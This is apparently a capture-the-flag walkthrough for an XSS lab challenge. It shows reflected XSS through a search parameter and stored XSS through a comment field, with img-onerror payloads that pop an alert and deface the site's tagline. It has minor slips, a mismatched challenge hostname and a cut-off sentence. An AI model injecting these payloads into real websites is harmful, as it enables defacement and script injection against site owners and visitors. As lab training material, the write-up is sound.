# Challenge #3 - Poema Reading Club 4

URL: http://3.challenge.xss.site

## Objectives

- As a proof of concept of the hack, you want to change the web page tag line from "Reading club for introspective people with social issues" to "Reading club for introspective people with social and XSS issues."
- You can achieve the above exploiting any of the two vulnerabilities.

## Resources

Please refer to this page to know how to manipulate an HTML page with DOM for superb XSS defacements:

- http://www.w3schools.com/js/js_htmldom.asp

## What you will learn

- How to find XSS vulnerabilities
- How to bypass simple XSS protections
- How to exploit persistent XSS
- How to change the appearance of a web page through DOM manipulation

## hints

- XSS Reflected
- XSS Stored

## XSS Reflected

### Steps

Add some word on the search field and press go.

Search term: example

Search url:
http://3.challenge.xss.site/search.php?term=example

Looking in the source code you will find the term reflected as below.

<img src="images/404.png" title="example">

To show the alert box we need send the follow payload.

"><img src=1 onerror="alert(document.domain)

Just add the payload to the search url replacing your search term.

http://2.challenge.xss.site/search.php?term="><img src=1 onerror="alert(document.domain)

This time our objective is to change the web page tag line from "Reading club for introspective people with social issues" to "Reading club for introspective people with social and XSS issues."

- Resource: https://melvingeorge.me/blog/add-remove-elements-dom-javascript

<div id="logo">
    <h1><a href="#">poema</a></h1>
    <p>Reading club for introspective  people with social issues</p>
</div>

Looking on the source code, you can see that we have one div with id "logo" and inside one paragraph where we want to change the text.

To change the 

var p1 = document.getElementById('logo').getElementsByTagName('p');

p1[0].textContent = 'Reading club for introspective people with social and XSS issues.';

Now replacing the payload to our new code.

http://2.challenge.xss.site/search.php?term="><img hidden src=1 onerror="var p1 = document.getElementById('logo').getElementsByTagName('p');p1[0].textContent = 'Reading club for introspective people with social and XSS issues.';

## XSS Stored

### Steps

The second XSS is on the comments.

Try to send a comment with the follow message.

<img src=1 onerror="alert(document.domain)">

As you can see the message field is message field is vulnerable to XSS attacks.

As we did before, replace the payload with the code to replace the paragraph.

<img src=1 onerror="var p1 = document.getElementById('logo').getElementsByTagName('p');p1[0].textContent = 'Reading club for introspective people with social and XSS issues.';">